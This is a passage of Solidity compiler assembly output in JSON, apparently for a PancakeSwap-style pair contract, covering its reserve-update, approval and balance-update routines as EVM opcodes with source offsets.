											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "tag",
											"value": "186"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3352,
											"end": 3375,
											"name": "DUP5"
										},
										{
											"begin": 3352,
											"end": 3375,
											"name": "GT"
										},
										{
											"begin": 3352,
											"end": 3375,
											"name": "DUP1"
										},
										{
											"begin": 3352,
											"end": 3375,
											"name": "ISZERO"
										},
										{
											"begin": 3352,
											"end": 3375,
											"name": "SWAP1"
										},
										{
											"begin": 3352,
											"end": 3402,
											"name": "PUSH [tag]",
											"value": "342"
										},
										{
											"begin": 3352,
											"end": 3402,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3379,
											"end": 3402,
											"name": "DUP4"
										},
										{
											"begin": 3379,
											"end": 3402,
											"name": "GT"
										},
										{
											"begin": 3379,
											"end": 3402,
											"name": "ISZERO"
										},
										{
											"begin": 3352,
											"end": 3402,
											"name": "tag",
											"value": "342"
										},
										{
											"begin": 3352,
											"end": 3402,
											"name": "JUMPDEST"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH [tag]",
											"value": "343"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "JUMPI"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP1"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP2"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MSTORE"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP3"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "ADD"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MSTORE"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP3"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "ADD"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204F564552464C4F57"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "78"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP3"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "ADD"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MSTORE"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "SWAP1"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "MLOAD"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "SWAP1"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "DUP2"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "SWAP1"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "SUB"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "ADD"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "SWAP1"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "REVERT"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "tag",
											"value": "343"
										},
										{
											"begin": 3331,
											"end": 3445,
											"name": "JUMPDEST"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "SLOAD"
										},
										{
											"begin": 3486,
											"end": 3511,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3486,
											"end": 3501,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3486,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3486,
											"end": 3511,
											"name": "AND"
										},
										{
											"begin": 3486,
											"end": 3511,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "SWAP1"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "DIV"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "DUP2"
										},
										{
											"begin": 3560,
											"end": 3578,
											"name": "AND"
										},
										{
											"begin": 3543,
											"end": 3578,
											"name": "DUP3"
										},
										{
											"begin": 3543,
											"end": 3578,
											"name": "SUB"
										},
										{
											"begin": 3543,
											"end": 3578,
											"name": "SWAP1"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "DUP2"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "AND"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "ISZERO"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "DUP1"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "ISZERO"
										},
										{
											"begin": 3615,
											"end": 3630,
											"name": "SWAP1"
										},
										{
											"begin": 3615,
											"end": 3648,
											"name": "PUSH [tag]",
											"value": "345"
										},
										{
											"begin": 3615,
											"end": 3648,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3634,
											"end": 3648,
											"name": "DUP5"
										},
										{
											"begin": 3634,
											"end": 3648,
											"name": "AND"
										},
										{
											"begin": 3634,
											"end": 3648,
											"name": "ISZERO"
										},
										{
											"begin": 3634,
											"end": 3648,
											"name": "ISZERO"
										},
										{
											"begin": 3615,
											"end": 3648,
											"name": "tag",
											"value": "345"
										},
										{
											"begin": 3615,
											"end": 3648,
											"name": "JUMPDEST"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "DUP1"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "ISZERO"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "PUSH [tag]",
											"value": "346"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3652,
											"end": 3666,
											"name": "DUP4"
										},
										{
											"begin": 3652,
											"end": 3666,
											"name": "AND"
										},
										{
											"begin": 3652,
											"end": 3666,
											"name": "ISZERO"
										},
										{
											"begin": 3652,
											"end": 3666,
											"name": "ISZERO"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "tag",
											"value": "346"
										},
										{
											"begin": 3615,
											"end": 3666,
											"name": "JUMPDEST"
										},
										{
											"begin": 3611,
											"end": 4007,
											"name": "ISZERO"
										},
										{
											"begin": 3611,
											"end": 4007,
											"name": "PUSH [tag]",
											"value": "347"
										},
										{
											"begin": 3611,
											"end": 4007,
											"name": "JUMPI"
										},
										{
											"begin": 3851,
											"end": 3862,
											"name": "DUP1"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "AND"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "PUSH [tag]",
											"value": "348"
										},
										{
											"begin": 3821,
											"end": 3830,
											"name": "DUP6"
										},
										{
											"begin": 3787,
											"end": 3814,
											"name": "PUSH [tag]",
											"value": "349"
										},
										{
											"begin": 3804,
											"end": 3813,
											"name": "DUP7"
										},
										{
											"begin": 3787,
											"end": 3803,
											"name": "PUSH [tag]",
											"value": "350"
										},
										{
											"begin": 3787,
											"end": 3814,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3787,
											"end": 3814,
											"name": "tag",
											"value": "349"
										},
										{
											"begin": 3787,
											"end": 3814,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3787,
											"end": 3820,
											"name": "AND"
										},
										{
											"begin": 3787,
											"end": 3820,
											"name": "SWAP1"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3787,
											"end": 3820,
											"name": "PUSH [tag]",
											"value": "351"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "AND"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "tag",
											"value": "348"
										},
										{
											"begin": 3787,
											"end": 3831,
											"name": "JUMPDEST"
										},
										{
											"begin": 3742,
											"end": 3762,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 3742,
											"end": 3862,
											"name": "DUP1"
										},
										{
											"begin": 3742,
											"end": 3862,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3782,
											"end": 3832,
											"name": "SWAP3"
										},
										{
											"begin": 3782,
											"end": 3832,
											"name": "SWAP1"
										},
										{
											"begin": 3782,
											"end": 3832,
											"name": "SWAP3"
										},
										{
											"begin": 3782,
											"end": 3832,
											"name": "AND"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "SWAP3"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "SWAP1"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "SWAP3"
										},
										{
											"begin": 3782,
											"end": 3862,
											"name": "MUL"
										},
										{
											"begin": 3742,
											"end": 3862,
											"name": "ADD"
										},
										{
											"begin": 3742,
											"end": 3862,
											"name": "SWAP1"
										},
										{
											"begin": 3742,
											"end": 3862,
											"name": "SSTORE"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "DUP2"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "AND"
										},
										{
											"begin": 3921,
											"end": 3965,
											"name": "PUSH [tag]",
											"value": "352"
										},
										{
											"begin": 3955,
											"end": 3964,
											"name": "DUP5"
										},
										{
											"begin": 3921,
											"end": 3948,
											"name": "PUSH [tag]",
											"value": "349"
										},
										{
											"begin": 3938,
											"end": 3947,
											"name": "DUP8"
										},
										{
											"begin": 3921,
											"end": 3937,
											"name": "PUSH [tag]",
											"value": "350"
										},
										{
											"begin": 3921,
											"end": 3948,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3921,
											"end": 3965,
											"name": "tag",
											"value": "352"
										},
										{
											"begin": 3921,
											"end": 3965,
											"name": "JUMPDEST"
										},
										{
											"begin": 3876,
											"end": 3896,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 3876,
											"end": 3996,
											"name": "DUP1"
										},
										{
											"begin": 3876,
											"end": 3996,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3916,
											"end": 3966,
											"name": "SWAP3"
										},
										{
											"begin": 3916,
											"end": 3966,
											"name": "SWAP1"
										},
										{
											"begin": 3916,
											"end": 3966,
											"name": "SWAP3"
										},
										{
											"begin": 3916,
											"end": 3966,
											"name": "AND"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "SWAP3"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "SWAP1"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "SWAP3"
										},
										{
											"begin": 3916,
											"end": 3996,
											"name": "MUL"
										},
										{
											"begin": 3876,
											"end": 3996,
											"name": "ADD"
										},
										{
											"begin": 3876,
											"end": 3996,
											"name": "SWAP1"
										},
										{
											"begin": 3876,
											"end": 3996,
											"name": "SSTORE"
										},
										{
											"begin": 3611,
											"end": 4007,
											"name": "tag",
											"value": "347"
										},
										{
											"begin": 3611,
											"end": 4007,
											"name": "JUMPDEST"
										},
										{
											"begin": 4016,
											"end": 4024,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "DUP1"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "DUP9"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "DUP2"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "AND"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "SWAP2"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "SWAP1"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "SWAP2"
										},
										{
											"begin": 4016,
											"end": 4044,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "DUP9"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "DUP4"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "AND"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "DUP2"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "MUL"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "SWAP2"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "SWAP1"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "SWAP2"
										},
										{
											"begin": 4054,
											"end": 4082,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "DUP8"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "AND"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "MUL"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "OR"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "SWAP3"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "DUP4"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "SWAP1"
										},
										{
											"begin": 4092,
											"end": 4127,
											"name": "SSTORE"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "DUP1"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "MLOAD"
										},
										{
											"begin": 4147,
											"end": 4155,
											"name": "DUP5"
										},
										{
											"begin": 4147,
											"end": 4155,
											"name": "DUP5"
										},
										{
											"begin": 4147,
											"end": 4155,
											"name": "AND"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "DUP2"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "MSTORE"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "SWAP2"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "SWAP1"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "SWAP4"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "DIV"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "SWAP1"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "SWAP2"
										},
										{
											"begin": 4157,
											"end": 4165,
											"name": "AND"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "DUP3"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "ADD"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "MSTORE"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "DUP2"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "MLOAD"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "PUSH",
											"value": "1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP3"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP2"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "DUP2"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP1"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SUB"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP1"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP2"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "ADD"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "SWAP1"
										},
										{
											"begin": 4142,
											"end": 4166,
											"name": "LOG1"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "POP"
										},
										{
											"begin": 3190,
											"end": 4173,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "tag",
											"value": "190"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2502,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP4"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP8"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP2"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "DUP6"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP6"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP3"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SUB"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "ADD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "LOG3"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "tag",
											"value": "197"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP4"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP2"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2690,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "KECCAK256"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SLOAD"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH [tag]",
											"value": "356"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2701,
											"end": 2706,
											"name": "DUP3"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2681,
											"end": 2700,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "tag",
											"value": "356"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP6"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "AND"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP2"
										},
										{
